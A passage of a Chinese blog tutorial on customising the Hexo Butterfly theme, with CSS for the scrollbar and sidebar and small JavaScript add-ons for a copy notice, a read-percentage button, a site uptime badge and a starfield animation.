class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -o-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>导航栏和滚动条设置</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*导航栏改大小（字体大于16px会变形，所以要做配置）*/</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-id">#card-toc</span> <span class="selector-class">.toc-content</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">115%</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> -<span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*滚动条设置*/</span></span><br><span class="line">::-webkit-scrollbar &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10px</span>; <span class="comment">/*大小*/</span></span><br><span class="line">&#125;</span><br><span class="line">::-webkit-scrollbar-thumb &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#14c6d3</span>; <span class="comment">/* 颜色 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>; <span class="comment">/* 圆角 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">::-webkit-scrollbar-track &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f1f1f1</span>; <span class="comment">/* 背景色 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>announcement.css</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*公告栏配置（标签自己加载公告栏里）*/</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span><span class="selector-class">.announcement_content</span> card_announce_top</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">  <span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">154</span>, <span class="number">35</span>, <span class="number">35</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span><span class="selector-class">.announcement_content</span> card_announce_tip</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">106</span>, <span class="number">151</span>, <span class="number">112</span>, <span class="number">0.2</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>; <span class="comment">/* 圆角 */</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>readPercent.css</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/* 返回顶部 */</span></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">15px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span><span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: -<span class="number">1px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标滑动到按钮上时显示返回顶部图标 */</span></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span><span class="selector-pseudo">:hover</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="JS插件"><a href="#JS插件" class="headerlink" title="JS插件"></a>JS插件</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p>butterfly中引入js文件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bottom:</span></span><br><span class="line">  <span class="comment"># - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js&quot;&gt;&lt;/script&gt;</span> <span class="comment"># 引入VUE(f12)</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js&quot;&gt;&lt;/script&gt;</span> <span class="comment"># 引入ElementUI(f12)</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;canvas</span> <span class="string">id=&quot;universe&quot;&gt;&lt;/canvas&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/universe.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">data-pjax</span> <span class="string">src=&quot;/js/readPercent.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/copy.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>copy.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js并小改了一下</span></span><br><span class="line"><span class="comment">// 防抖全局计时器</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">TT</span> = <span class="literal">null</span>;    <span class="comment">//time用来控制事件的触发</span></span><br><span class="line"><span class="comment">// 防抖函数:fn-&gt;逻辑 time-&gt;防抖时间</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, time</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">TT</span> !== <span class="literal">null</span>) <span class="built_in">clearTimeout</span>(<span class="variable constant_">TT</span>);</span><br><span class="line">    <span class="variable constant_">TT</span> = <span class="built_in">setTimeout</span>(fn, time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制提醒</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;copy&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">debounce</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.$notify(&#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&quot;复制成功&quot;</span>,</span><br><span class="line">                    <span class="attr">message</span>: <span class="string">&quot;转载记得保留原文链接哦! &quot;</span>,</span><br><span class="line">                    <span class="attr">position</span>: <span class="string">&#x27;top-left&#x27;</span>,</span><br><span class="line">                    <span class="attr">offset</span>: <span class="number">50</span>,</span><br><span class="line">                    <span class="attr">showClose</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">type</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                    <span class="attr">duration</span>: <span class="number">5000</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;, <span class="number">300</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁用控制台（event会显示弃用，要用window.event）</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params">e</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">123</span> == <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> || (e.<span class="property">ctrlKey</span> &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; (<span class="number">74</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> || <span class="number">73</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span>|| <span class="number">67</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span>)) || (e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">85</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">debounce</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">                <span class="attr">data</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.$notify(&#123;</span><br><span class="line">                        <span class="attr">title</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="attr">message</span>: <span class="string">&quot;不能打开F12哦!&quot;</span>,</span><br><span class="line">                        <span class="attr">position</span>: <span class="string">&#x27;top-left&#x27;</span>,</span><br><span class="line">                        <span class="attr">offset</span>: <span class="number">50</span>,</span><br><span class="line">                        <span class="attr">showClose</span>: <span class="literal">true</span>,</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                        <span class="attr">duration</span>: <span class="number">5000</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;, <span class="number">300</span>);</span><br><span class="line">        <span class="comment">// return window.event.keyCode = 0,window.event.preventDefault(),!1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>readPercent.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onscroll</span> = percent;<span class="comment">// 执行函数</span></span><br><span class="line"><span class="comment">// 页面百分比</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">percent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">window</span>.<span class="property">pageYOffset</span>, <span class="comment">// 卷去高度</span></span><br><span class="line">        b = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollHeight</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">offsetHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">offsetHeight</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>) - <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>, <span class="comment">// 整个网页高度</span></span><br><span class="line">        result = <span class="title class_">Math</span>.<span class="title function_">round</span>(a / b * <span class="number">100</span>), <span class="comment">// 计算百分比</span></span><br><span class="line">        up = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#go-up&quot;</span>); <span class="comment">// 获取按钮</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &gt;= <span class="number">95</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">innerHTML</span> = result + <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>runtime.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js并小改了一下</span></span><br><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123;</span><br><span class="line">    now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>() + <span class="number">1e3</span>);</span><br><span class="line">    <span class="comment">//var e = new Date(&quot;05/20/2023 00:00:00&quot;)</span></span><br><span class="line">      <span class="comment">//, t = Math.trunc(234e8 + (now - e) / 1e3 * 17)</span></span><br><span class="line">      <span class="comment">//, a = (t / 1496e5).toFixed(6)</span></span><br><span class="line">      <span class="comment">//, </span></span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;05/20/2023 00:00:00&quot;</span>)</span><br><span class="line">      , n = (now - o) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span></span><br><span class="line">      , r = <span class="title class_">Math</span>.<span class="title function_">floor</span>(n)</span><br><span class="line">      , i = (now - o) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> - <span class="number">24</span> * r</span><br><span class="line">      , s = <span class="title class_">Math</span>.<span class="title function_">floor</span>(i);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(s).<span class="property">length</span> &amp;&amp; (s = <span class="string">&quot;0&quot;</span> + s);</span><br><span class="line">    <span class="keyword">var</span> d = (now - o) / <span class="number">1e3</span> / <span class="number">60</span> - <span class="number">1440</span> * r - <span class="number">60</span> * s</span><br><span class="line">      , l = <span class="title class_">Math</span>.<span class="title function_">floor</span>(d);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(l).<span class="property">length</span> &amp;&amp; (l = <span class="string">&quot;0&quot;</span> + l);</span><br><span class="line">    <span class="keyword">var</span> g = (now - o) / <span class="number">1e3</span> - <span class="number">86400</span> * r - <span class="number">3600</span> * s - <span class="number">60</span> * l</span><br><span class="line">      , b = <span class="title class_">Math</span>.<span class="title function_">round</span>(g);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(b).<span class="property">length</span> &amp;&amp; (b = <span class="string">&quot;0&quot;</span> + b);</span><br><span class="line">    <span class="keyword">let</span> c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    c = s &lt; <span class="number">18</span> &amp;&amp; s &gt;= <span class="number">9</span> ? <span class="string">`&lt;img class=&quot;boardsign&quot; src=&quot;https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg&quot; title=&quot;偶尔摸鱼有害健康，常常摸鱼收获满满~&quot;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站已运行了 <span class="subst">$&#123;r&#125;</span> 天 <span class="subst">$&#123;s&#125;</span> 小时 <span class="subst">$&#123;l&#125;</span> 分 <span class="subst">$&#123;b&#125;</span> 秒 &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;/div&gt;`</span> : <span class="string">`&lt;img class=&quot;boardsign&quot; src=&quot;https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg&quot; title=&quot;下班了就该开开心心地玩耍~&quot;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站已运行了 <span class="subst">$&#123;r&#125;</span> 天 <span class="subst">$&#123;s&#125;</span> 小时 <span class="subst">$&#123;l&#125;</span> 分 <span class="subst">$&#123;b&#125;</span> 秒 &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;/div&gt;`</span>,</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>) &amp;&amp; (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>).<span class="property">innerHTML</span> = c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setInterval</span>((<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">createtime</span>()</span><br><span class="line">&#125;</span><br><span class="line">), <span class="number">1e3</span>);</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p><strong>universe.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dark</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> = <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> || <span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span> || <span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span> || <span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>;</span><br><span class="line">    <span class="keyword">var</span> n, e, i, h, t = <span class="number">.05</span>, s = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;universe&quot;</span>), o = !<span class="number">0</span>, a = <span class="string">&quot;180,184,240&quot;</span>, r = <span class="string">&quot;226,225,142&quot;</span>, d = <span class="string">&quot;226,225,224&quot;</span>, c = [];</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n = <span class="variable language_">window</span>.<span class="property">innerWidth</span>,</span><br><span class="line">        e = <span class="variable language_">window</span>.<span class="property">innerHeight</span>,</span><br><span class="line">        i = <span class="number">.216</span> * n,</span><br><span class="line">        s.<span class="title function_">setAttribute</span>(<span class="string">&quot;width&quot;</span>, n),</span><br><span class="line">        s.<span class="title function_">setAttribute</span>(<span class="string">&quot;height&quot;</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>) &#123;</span><br><span class="line">        h.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, n, e);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = c.<span class="property">length</span>, i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> s = c[i];</span><br><span class="line">            s.<span class="title function_">move</span>(),</span><br><span class="line">            s.<span class="title function_">fadeIn</span>(),</span><br><span class="line">            s.<span class="title function_">fadeOut</span>(),</span><br><span class="line">            s.<span class="title function_">draw</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">reset</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">giant</span> = <span class="title function_">m</span>(<span class="number">3</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">comet</span> = !<span class="variable language_">this</span>.<span class="property">giant</span> &amp;&amp; !o &amp;&amp; <span class="title function_">m</span>(<span class="number">10</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x</span> = <span class="title function_">l</span>(<span class="number">0</span>, n - <span class="number">10</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">y</span> = <span class="title function_">l</span>(<span class="number">0</span>, e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">r</span> = <span class="title function_">l</span>(<span class="number">1.1</span>, <span class="number">2.6</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dx</span> = <span class="title function_">l</span>(t, <span class="number">6</span> * t) + (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>) * t * <span class="title function_">l</span>(<span class="number">50</span>, <span class="number">120</span>) + <span class="number">2</span> * t,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dy</span> = -<span class="title function_">l</span>(t, <span class="number">6</span> * t) - (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>) * t * <span class="title function_">l</span>(<span class="number">50</span>, <span class="number">120</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingOut</span> = <span class="literal">null</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingIn</span> = !<span class="number">0</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">0</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacityTresh</span> = <span class="title function_">l</span>(<span class="number">.2</span>, <span class="number">1</span> - <span class="number">.4</span> * (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>)),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">do</span> = <span class="title function_">l</span>(<span class="number">5e-4</span>, <span class="number">.002</span>) + <span class="number">.001</span> * (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fadeIn</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingIn</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingIn</span> = !(<span class="variable language_">this</span>.<span class="property">opacity</span> &gt; <span class="variable language_">this</span>.<span class="property">opacityTresh</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacity</span> += <span class="variable language_">this</span>.<span class="property">do</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fadeOut</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingOut</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingOut</span> = !(<span class="variable language_">this</span>.<span class="property">opacity</span> &lt; <span class="number">0</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacity</span> -= <span class="variable language_">this</span>.<span class="property">do</span> / <span class="number">2</span>,</span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">x</span> &gt; n || <span class="variable language_">this</span>.<span class="property">y</span> &lt; <span class="number">0</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingOut</span> = !<span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()))</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">draw</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (h.<span class="title function_">beginPath</span>(),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">giant</span>)</span><br><span class="line">                h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + a + <span class="string">&quot;,&quot;</span> + <span class="variable language_">this</span>.<span class="property">opacity</span> + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>, !<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">comet</span>) &#123;</span><br><span class="line">                h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + d + <span class="string">&quot;,&quot;</span> + <span class="variable language_">this</span>.<span class="property">opacity</span> + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="number">1.5</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>, !<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; <span class="number">30</span>; t++)</span><br><span class="line">                    h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + d + <span class="string">&quot;,&quot;</span> + (<span class="variable language_">this</span>.<span class="property">opacity</span> - <span class="variable language_">this</span>.<span class="property">opacity</span> / <span class="number">20</span> * t) + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                    h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span> - <span class="variable language_">this</span>.<span class="property">dx</span> / <span class="number">4</span> * t, <span class="variable language_">this</span>.<span class="property">y</span> - <span class="variable language_">this</span>.<span class="property">dy</span> / <span class="number">4</span> * t - <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">                    h.<span class="title function_">fill</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + r + <span class="string">&quot;,&quot;</span> + <span class="variable language_">this</span>.<span class="property">opacity</span> + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="variable language_">this</span>.<span class="property">r</span>, <span class="variable language_">this</span>.<span class="property">r</span>);</span><br><span class="line">            h.<span class="title function_">closePath</span>(),</span><br><span class="line">            h.<span class="title function_">fill</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">move</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x</span> += <span class="variable language_">this</span>.<span class="property">dx</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">y</span> += <span class="variable language_">this</span>.<span class="property">dy</span>,</span><br><span class="line">            !<span class="number">1</span> === <span class="variable language_">this</span>.<span class="property">fadingOut</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">reset</span>(),</span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">x</span> &gt; n - n / <span class="number">4</span> || <span class="variable language_">this</span>.<span class="property">y</span> &lt; <span class="number">0</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingOut</span> = !<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            o = !<span class="number">1</span></span><br><span class="line">        &#125;, <span class="number">50</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">1e3</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="number">1</span> &lt; <span class="number">10</span> * t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t, i</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>() * (i - t) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">f</span>(),</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, f, !<span class="number">1</span>),</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        h = s.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; i; t++)</span><br><span class="line">            c[t] = <span class="keyword">new</span> y,</span><br><span class="line">            c[t].<span class="title function_">reset</span>();</span><br><span class="line">        <span class="title function_">u</span>()</span><br><span class="line">    &#125;(),</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getAttribute</span>(<span 